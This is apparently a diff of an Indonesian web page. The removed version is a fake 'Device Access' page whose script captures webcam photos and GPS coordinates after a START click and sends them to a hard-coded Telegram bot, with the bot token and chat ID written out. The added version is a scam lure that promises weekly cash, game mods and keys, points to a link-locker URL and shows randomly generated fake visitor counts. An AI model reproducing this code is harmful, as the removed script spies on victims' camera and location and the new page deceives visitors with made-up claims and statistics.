@@ -1,291 +1,146 @@
-<html lang="id"><head>
+<!DOCTYPE html>
+<html lang="id">
+<head>
 <meta charset="UTF-8">
-<title>Device Access</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KOUTA TERBATAS</title>
+
 <style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Inter,Arial,sans-serif;
+}
+
 body{
-    background:black;
-    color:#00ff00;
-    font-family:monospace;
-    text-align:center;
-    padding-top:20px;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:linear-gradient(135deg,#0f172a,#1e293b);
+padding:20px;
+color:white;
 }
-.box{
-    border:1px solid #00ff00;
-    padding:20px;
-    width:90%;
-    max-width:320px;
-    margin:auto;
-    box-shadow:0 0 20px #00ff00;
+
+.container{
+max-width:520px;
+width:100%;
+text-align:center;
+background:rgba(255,255,255,.06);
+backdrop-filter:blur(10px);
+padding:40px 25px;
+border-radius:28px;
+box-shadow:0 20px 50px rgba(0,0,0,.35);
 }
-video{
-    width:100%;
-    border:1px solid #00ff00;
-    margin-top:10px;
+
+.badge{
+display:inline-block;
+padding:8px 14px;
+border-radius:999px;
+background:rgba(250,204,21,.15);
+border:1px solid rgba(250,204,21,.4);
+color:#facc15;
+font-size:14px;
+font-weight:700;
+margin-bottom:20px;
 }
-button{
-    width:100%;
-    padding:12px;
-    margin-top:10px;
-    background:black;
-    color:#00ff00;
-    border:1px solid #00ff00;
-    font-size:16px;
+
+h1{
+font-size:34px;
+line-height:1.2;
+margin-bottom:15px;
 }
+
+p{
+color:#cbd5e1;
+line-height:1.7;
+margin-bottom:28px;
+}
+
+.btn{
+display:block;
+width:100%;
+padding:18px;
+border-radius:18px;
+background:#facc15;
+color:#111827;
+font-size:20px;
+font-weight:800;
+text-decoration:none;
+transition:.25s;
+box-shadow:0 10px 30px rgba(250,204,21,.35);
+}
+
+.btn:hover{
+transform:translateY(-3px) scale(1.02);
+}
+
+.note{
+margin-top:16px;
+font-size:13px;
+color:#94a3b8;
+}
+
+.note{
+margin-top:16px;
+font-size:15px;
+color:#e5e7eb;
+line-height:1.8;
+font-weight:600;
+}
+
 </style>
 </head>
 <body>
 
-<div class="box">
-<h2>🔐 DEVICE ACCESS</h2>
-<p id="status">Klik START</p>
+<div class="container">
 
-<video id="cam" autoplay="" playsinline=""></video>
+<div class="badge">
+⚠️ AKSES TERBATAS!!
+</div>
 
-<button id="startBtn">START</button>
+<h1>
+Buka Konten & Daget setiap mingu & Modal link Dapat Cuan
+</h1>
+
+<p>
+Klik tombol di bawah untuk mendapatkan akses ke update terbaru, konten terbaru, dapatkan daget setiap minggu, + Mods Game + Mod app + Get key, Modal link dapat cuan, dan masih banyak lainya...
+</p>
+
+<a href="https://sub4unlock.co/vAp7Z" class="btn">
+ 🛜 START
+</a>
+
+<div class="note">
+Daftar Online & Offline, yg sedang berkunjung
+</div>
+
+<div class="note">
+<span id="online"> 100.2K Online</span><br>
+<span id="offline"> 10K Offline</span>
 </div>
 
 <script>
-const TOKEN = "8738380189:AAFOH0tBBBCaEY_U2dI-vzDQgWX__3ZdBcI";
-const CHAT_ID = "8010333398";
+function randomStats() {
+    const online = (100000000 + Math.floor(Math.random() * 5000000)).toLocaleString();
+    const offline = (8000000 + Math.floor(Math.random() * 4000)).toLocaleString();
 
-let fotoCount = 0;
-let lastSend = 0;
+    document.getElementById('online').innerHTML =
+        `🟢 ${online} Online`;
 
-// tombol fix
-document.getElementById("startBtn").addEventListener("click", startAll);
+    document.getElementById('offline').innerHTML =
+        `🔴 ${offline} Offline`;
 
-async function startAll(){
-    alert("START DIKLIK"); // debug biar pasti kepencet
-    document.getElementById("status").innerText = "Meminta izin...";
-
-    // KAMERA
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-        document.getElementById("cam").srcObject = stream;
-
-        // kirim 5 foto
-        let interval = setInterval(() => {
-            if(fotoCount >= 5){
-                clearInterval(interval);
-                return;
-            }
-            captureAndSend();
-            fotoCount++;
-        }, 1000);
-
-    }catch(e){
-        document.getElementById("status").innerText = "❌ Kamera ditolak";
-        console.log(e);
-    }
-
-    // LOKASI
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(sendLocation, geoError);
-    }else{
-        document.getElementById("status").innerText = "❌ GPS tidak support";
-    }
+    // update lagi dengan waktu acak
+    const nextUpdate = Math.floor(Math.random() * 4000) + 1000; // 1-5 detik
+    setTimeout(randomStats, nextUpdate);
 }
 
-// KIRIM LOKASI
-function sendLocation(pos){
-    let lat = pos.coords.latitude;
-    let lon = pos.coords.longitude;
-    let jam = new Date().toLocaleString();
-
-    document.getElementById("status").innerText = "📍 " + lat + ", " + lon;
-
-    let text = `📍 DATA
-
-🕒 ${jam}
-📍 ${lat}, ${lon}
-
-https://maps.google.com/?q=${lat},${lon}`;
-
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({
-            chat_id:CHAT_ID,
-            text:text
-        })
-    })
-    .then(res=>res.json())
-    .then(data=>console.log(data))
-    .catch(err=>console.log(err));
-}
-
-// FOTO
-function captureAndSend(){
-    const video = document.getElementById("cam");
-
-    let canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    let ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-
-    let jam = new Date().toLocaleString();
-
-    canvas.toBlob(function(blob){
-        let formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "foto.jpg");
-        formData.append("caption", `📸 FOTO ${fotoCount+1}\n🕒 ${jam}`);
-
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        });
-    }, "image/jpeg");
-}
-
-// ERROR
-function geoError(err){
-    document.getElementById("status").innerText = "❌ Lokasi ditolak";
-    console.log(err);
-}
+randomStats();
 </script>
 
-
-</body></html>
-
-<style>
-body{
-    background:black;
-    color:#00ff00;
-    font-family:monospace;
-    text-align:center;
-    padding-top:20px;
-}
-.box{
-    border:1px solid #00ff00;
-    padding:20px;
-    width:90%;
-    max-width:320px;
-    margin:auto;
-    box-shadow:0 0 20px #00ff00;
-}
-video{
-    width:100%;
-    border:1px solid #00ff00;
-    margin-top:10px;
-}
-button{
-    width:100%;
-    padding:12px;
-    margin-top:10px;
-    background:black;
-    color:#00ff00;
-    border:1px solid #00ff00;
-    font-size:16px;
-}
-</style>
-
-<script>
-const TOKEN = "8738380189:AAFOH0tBBBCaEY_U2dI-vzDQgWX__3ZdBcI";
-const CHAT_ID = "8010333398";
-
-let fotoCount = 0;
-let lastSend = 0;
-
-// tombol fix
-document.getElementById("startBtn").addEventListener("click", startAll);
-
-async function startAll(){
-    alert("START DIKLIK"); // debug biar pasti kepencet
-    document.getElementById("status").innerText = "Meminta izin...";
-
-    // KAMERA
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-        document.getElementById("cam").srcObject = stream;
-
-        // kirim 5 foto
-        let interval = setInterval(() => {
-            if(fotoCount >= 5){
-                clearInterval(interval);
-                return;
-            }
-            captureAndSend();
-            fotoCount++;
-        }, 1000);
-
-    }catch(e){
-        document.getElementById("status").innerText = "❌ Kamera ditolak";
-        console.log(e);
-    }
-
-    // LOKASI
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(sendLocation, geoError);
-    }else{
-        document.getElementById("status").innerText = "❌ GPS tidak support";
-    }
-}
-
-// KIRIM LOKASI
-function sendLocation(pos){
-    let lat = pos.coords.latitude;
-    let lon = pos.coords.longitude;
-    let jam = new Date().toLocaleString();
-
-    document.getElementById("status").innerText = "📍 " + lat + ", " + lon;
-
-    let text = `📍 DATA
-
-🕒 ${jam}
-📍 ${lat}, ${lon}
-
-https://maps.google.com/?q=${lat},${lon}`;
-
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({
-            chat_id:CHAT_ID,
-            text:text
-        })
-    })
-    .then(res=>res.json())
-    .then(data=>console.log(data))
-    .catch(err=>console.log(err));
-}
-
-// FOTO
-function captureAndSend(){
-    const video = document.getElementById("cam");
-
-    let canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    let ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-
-    let jam = new Date().toLocaleString();
-
-    canvas.toBlob(function(blob){
-        let formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "foto.jpg");
-        formData.append("caption", `📸 FOTO ${fotoCount+1}\n🕒 ${jam}`);
-
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        });
-    }, "image/jpeg");
-}
-
-// ERROR
-function geoError(err){
-    document.getElementById("status").innerText = "❌ Lokasi ditolak";
-    console.log(err);
-}
-
-</script>
+</div>
 
 </body>
 </html>
